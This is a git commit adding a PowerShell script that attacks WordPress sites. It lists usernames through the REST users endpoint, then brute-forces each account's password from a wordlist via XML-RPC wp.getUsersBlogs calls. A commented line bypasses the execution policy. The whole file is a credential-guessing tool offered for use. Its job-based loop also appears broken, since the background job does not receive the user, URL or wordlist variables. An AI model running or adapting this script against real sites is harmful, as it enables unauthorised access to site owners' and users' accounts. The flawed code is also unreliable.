a5fdfe50a8c0680b92ad06b7289d1180b90a3b25
Luis Medina <40681139+c04tl@users.noreply.github.com>
2021-10-04 20:55:44 +0000

    Script de Powershell
    Script que enumera usuarios y hace fuerza bruta con un diccionario proporcionado

---
+++ Powershell/wp-bruter.ps1
@@ -0,0 +1,42 @@
+﻿#Bypass de ejecución de script solo para el proceso actual
+#Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
+
+#obtener usuarios
+param ($url, $passwordf)
+if($url -eq $null -or $passwordf -eq $null)
+{
+    Write-Host "Vacias"
+    exit
+}
+$respuesta= Invoke-WebRequest -Uri "$($url)/wp-json/wp/v2/users"
+
+$usuarios = $respuesta | ConvertFrom-Json
+$usuarios = $usuarios.slug
+
+
+#Fuerza bruta
+foreach($usuario in $usuarios)
+{
+    $hilo = Start-Job -ScriptBlock { foreach($contra in Get-Content $passwordf)
+    {
+        Write-Host "$($usuario):$($contra)"
+        $cuerpo=
+        "
+        <methodCall>
+            <methodName>wp.getUsersBlogs</methodName>
+            <params>
+                <param><value>$($usuario)</value></param>
+                <param><value>$($contra)</value></param>
+            </params>
+        </methodCall>
+        "
+        $respuesta= Invoke-WebRequest -Uri "$($url)/xmlrpc.php" -Method POST -Body $cuerpo
+        if(-not $respuesta.Content.Contains("Incorrectos"))
+        {
+            Write-Host "la clave es: "$contra
+            exit 0
+        }
+    }
+    }
+    Receive-Job $hilo
+}
